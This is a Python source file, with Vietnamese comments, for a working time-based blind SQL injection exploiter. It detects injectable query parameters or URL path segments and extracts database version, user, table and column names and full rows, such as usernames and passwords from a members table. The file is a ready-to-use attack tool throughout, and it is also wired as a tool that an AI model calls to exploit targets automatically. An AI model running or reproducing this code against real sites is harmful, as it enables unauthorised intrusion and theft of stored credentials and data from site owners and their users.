#!/usr/bin/env python3
"""
aixsec-x — sqli_blind_poc.py
SQLi time-based blind exploiter KHÔNG cần sqlmap (Python thuần: requests + timing).

Hỗ trợ 2 kiểu vị trí inject:
  - query:  /product.php?id=123          →  ?id=123' AND (cond) AND SLEEP(3)-- -
  - path:   /search/123.html             →  /search/123%27%20AND%20(cond)%20AND%20SLEEP(3)--%20-.html

Dùng làm:
  1) CLI độc lập (chạy tay trên máy Kali)
  2) Executor cho ToolSpec `sqli_blind_extract` của AIXSEC-X
     (model gọi tool → exploit tự động khi sqlmap fail)

Chạy CLI:
  python3 sqli_blind_poc.py -u "https://target/search/123.html" --detect-only
  python3 sqli_blind_poc.py -u "https://target/search/123.html" --dump-table fs_members --columns id,username,password
  python3 sqli_blind_poc.py -u "https://target/product.php?id=1" --get-dbname --delay 2 --threshold 1.6 --max-len 30
"""
from __future__ import annotations

import argparse
import json
import sys
import time
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

import requests

# charset: ưu tiên ký tự hay gặp (digit, lower, bound) — ít probe hơn
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ _.,:;@-+/%"
_USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")


class TimeBlindExploiter:
    """Detect + extract dữ liệu bằng time-based blind SQLi (binary search)."""

    def __init__(self, url: str, delay: float = 3.0, threshold: float = 2.5,
                 timeout: int = 15, headers: dict | None = None):
        self.url = url
        self.delay = max(0.5, float(delay))
        self.threshold = max(0.7, float(threshold))
        self.timeout = int(timeout)
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": _USER_AGENT})
        if headers:
            self.s.headers.update(headers)

        p = urlparse(url)
        self.scheme = p.scheme or "http"
        self.netloc = p.netloc
        self.path = p.path
        self.query = p.query
        self.fragment = p.fragment

        self.params = parse_qs(p.query)
        self.param = None            # query param bị inject (nếu mode=query)
        self.path_seg_idx = None     # index segment trong path (nếu mode=path)
        self.mode = None             # "query" | "path"
        self.orig_value = ""         # giá trị gốc (param value / path segment)
        self.quote = ""              # "'" | '"' | "" — quote đóng được tìm thấy
        self.comment = "-- -"        # "-- -" | "#"
        self.baseline = 0.0

    # ────────────── thiết lập vị trí inject ──────────────
    def _locate_injection(self) -> str:
        """Tìm vị trí inject: ưu tiên query param số, fallback path segment số."""
        for k, v in self.params.items():
            if v and str(v[0]).strip().lstrip("-").isdigit():
                self.param, self.orig_value = k, str(v[0]).strip()
                self.mode = "query"
                return f"query param '{k}' = {self.orig_value}"
        # path: /search/123.html → segment cuối số
        segs = [s for s in self.path.split("/") if s]
        for i, seg in enumerate(segs):
            core = seg.split(".")[0] if "." in seg else seg
            if core.lstrip("-").isdigit():
                self.path_seg_idx = i
                self.orig_value = core
                self.mode = "path"
                return f"path segment [{i}] = {seg}"
        return ""

    # ────────────── build URL với payload ──────────────
    def _build_url(self, injected: str) -> str:
        if self.mode == "query":
            q = {}
            for k, v in self.params.items():
                q[k] = [injected] if k == self.param else list(v)
            return urlunparse((self.scheme, self.netloc, self.path, "",
                               urlencode(q, doseq=True), self.fragment))
        # path mode — URL-encode payload, GIỮ suffix (.html) để không vỡ routing
        segs = [s for s in self.path.split("/") if s]
        raw_seg = segs[self.path_seg_idx]
        suffix = ""
        if "." in raw_seg:
            core, suffix = raw_seg.split(".", 1)
            suffix = "." + suffix  # vd: .html
        segs[self.path_seg_idx] = quote(injected, safe="") + suffix
        new_path = "/" + "/".join(segs)
        return urlunparse((self.scheme, self.netloc, new_path, "",
                           self.query, self.fragment))

    def _payload(self, expr: str) -> str:
        """'AND (expr) AND SLEEP(delay) -- -' gắn sau orig_value + quote."""
        return (f"{self.orig_value}{self.quote} AND ({expr}) AND SLEEP({self.delay})"
                f"{self.comment}")

    def _request(self, injected: str) -> tuple[float, int, str]:
        url = self._build_url(injected)
        try:
            t0 = time.time()
            r = self.s.get(url, timeout=self.timeout, allow_redirects=True)
            return time.time() - t0, r.status_code, r.text[:300]
        except requests.RequestException as e:
            return 0.0, 0, str(e)

    # ────────────── detect ──────────────
    def detect(self) -> bool:
        """Baseline + brute quote/comment nhẹ → True nếu SLEEP gây delay >= threshold."""
        loc = self._locate_injection()
        if not loc:
            return False
        print(f"[*] Injection position: {loc}")
        t0, _, _ = self._request(self.orig_value)
        self.baseline = t0
        print(f"[*] Baseline: {t0:.2f}s")

        trials = []
        for q in ("'", '"', ""):
            for c in ("-- -", "#", ""):
                trials.append((q, c))
        for q, c in trials:
            self.quote, self.comment = q, c
            expr = "SLEEP(%d)" % self.delay
            t, status, _ = self._request(self._payload(expr))
            delta = t - self.baseline
            print(f"    quote={q or 'none':<5} comment={c or 'none':<5} "
                  f"→ {t:.2f}s (delta {delta:+.2f}s)")
            if delta >= self.threshold:
                print(f"[+] SQLi CONFIRMED (delta {delta:.2f}s ≥ {self.threshold}s)")
                return True
        print("[-] SQLi NOT CONFIRMED")
        return False

    # ────────────── helpers ──────────────
    def _is_true(self, expr: str) -> bool:
        """(expr) TRUE → SLEEP chạy → slow response."""
        t, _, _ = self._request(self._payload(expr))
        return (t - self.baseline) >= self.threshold

    def _verify_char(self, expr: str, char: str) -> bool:
        return self._is_true(f"ASCII(SUBSTRING(({expr}),{self._pos},1))={ord(char)}")

    def extract_char(self, expr: str, pos: int, charset: str = CHARSET) -> str | None:
        """Binary search: ASCII(SUBSTRING((expr),pos,1)) >= ord(mid) AND SLEEP()."""
        low, high = 0, len(charset) - 1
        while low < high:
            mid = (low + high + 1) // 2
            cond = f"ASCII(SUBSTRING(({expr}),{pos},1))>={ord(charset[mid])}"
            if self._is_true(cond):
                low = mid
            else:
                high = mid - 1
        # verify bằng so khớp chính xác
        if self._is_true(f"ASCII(SUBSTRING(({expr}),{pos},1))={ord(charset[low])}"):
            return charset[low]
        return None

    def extract_string(self, expr: str, max_len: int = 50, charset: str = CHARSET) -> str:
        out = []
        for pos in range(1, max_len + 1):
            ch = self.extract_char(expr, pos, charset)
            if ch is None:
                if pos == 1:
                    return ""
                break
            out.append(ch)
            print(f"\r    [{expr}] pos {pos} = '{ch}'  (got: {''.join(out)})   ", end="", flush=True)
        print()
        return "".join(out)

    # ────────────── extraction convenience ──────────────
    def version(self) -> str:
        return self.extract_string("VERSION()", 40, "0123456789.-")

    def database(self) -> str:
        return self.extract_string("DATABASE()", 50)

    def user(self) -> str:
        return self.extract_string("USER()", 60)

    def tables(self, db: str = "", max_items: int = 30, max_len: int = 40) -> list[str]:
        q = ("SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES "
             + (f"WHERE TABLE_SCHEMA='{db}'" if db else ""))
        return [t for t in self.extract_string(q, 200).split(",") if t][:max_items]

    def columns(self, table: str, db: str = "", max_len: int = 200) -> list[str]:
        q = ("SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS "
             f"WHERE TABLE_NAME='{table}'"
             + (f" AND TABLE_SCHEMA='{db}'" if db else ""))
        return [c for c in self.extract_string(q, max_len).split(",") if c]

    def dump(self, table: str, columns: list[str], limit: int = 10,
             max_len: int = 60) -> list[dict]:
        rows = []
        for i in range(1, limit + 1):
            row = {}
            for col in columns:
                val = self.extract_string(
                    f"SELECT {col} FROM {table} LIMIT 1 OFFSET {i - 1}", max_len)
                row[col] = val
            if not row or all(not v for v in row.values()):
                break
            rows.append(row)
        return rows

    def report(self, action: str = "detect", **kw) -> dict:
        """Kết quả có cấu trúc cho ToolSpec `sqli_blind_extract`."""
        out = {"url": self.url, "confirmed": False, "data": {}}
        if not self.detect():
            out["error"] = "SQLi not confirmed"
            return out
        out["confirmed"] = True
        out["mode"] = self.mode
        out["injection"] = f"{self.mode}@{self.param or self.path_seg_idx} quote={self.quote or 'none'}"
        if action in ("version", "detect"):
            out["data"]["version"] = self.version() if action == "version" else None
        elif action == "database":
            out["data"]["database"] = self.database()
        elif action == "user":
            out["data"]["user"] = self.user()
        elif action == "tables":
            out["data"]["tables"] = self.tables(kw.get("db_name", ""))
        elif action == "dump":
            cols = kw.get("columns", [])
            if not cols:
                out["error"] = "Cần columns"
                return out
            if not kw.get("table"):
                out["error"] = "Cần table"
                return out
            out["data"]["table"] = kw["table"]
            out["data"]["rows"] = self.dump(kw["table"], cols,
                                            int(kw.get("limit", 10)),
                                            int(kw.get("max_len", 60)))
        return out


def cli() -> int:
    ap = argparse.ArgumentParser(description="SQLi time-based blind exploiter (không sqlmap)")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--delay", type=float, default=3.0)
    ap.add_argument("--threshold", type=float, default=2.5)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--detect-only", action="store_true")
    ap.add_argument("--get-version", action="store_true")
    ap.add_argument("--get-user", action="store_true")
    ap.add_argument("--get-dbname", action="store_true")
    ap.add_argument("--list-tables", action="store_true")
    ap.add_argument("--dump-table", default="")
    ap.add_argument("--columns", default="")
    ap.add_argument("--db-name", default="")
    ap.add_argument("--limit", type=int, default=10)
    ap.add_argument("--max-len", type=int, default=60)
    ap.add_argument("--json", action="store_true", help="Xuất kết quả JSON")
    args = ap.parse_args()

    ex = TimeBlindExploiter(args.url, delay=args.delay, threshold=args.threshold,
                            timeout=args.timeout)
    print(f"===== SQLi blind exploiter =====")
    print(f"Target: {args.url}\n")

    if not ex.detect():
        print("\n[!] SQLi không xác nhận — thoát.")
        return 1
    if args.detect_only:
        print("\n[✓] CONFIRMED (detect-only)")
        return 0

    data = {}
    if args.get_version:
        data["version"] = f"Version: {ex.version()}"
    if args.get_user:
        data["user"] = f"User: {ex.user()}"
    if args.get_dbname:
        db = ex.database()
        data["database"] = f"Database: {db}"
        args.db_name = args.db_name or db
    if args.list_tables:
        data["tables"] = f"Tables: {ex.tables(args.db_name)}"
    if args.dump_table:
        cols = [c.strip() for c in args.columns.split(",") if c.strip()]
        rows = ex.dump(args.dump_table, cols, args.limit, args.max_len)
        data["dump"] = json.dumps(rows, ensure_ascii=False, indent=2)
    if args.json:
        print(json.dumps({"url": args.url, "confirmed": True, "data": data},
                         ensure_ascii=False, indent=2))
    else:
        for k, v in data.items():
            print(f"[+] {k}: {v}")
    return 0


if __name__ == "__main__":
    sys.exit(cli())
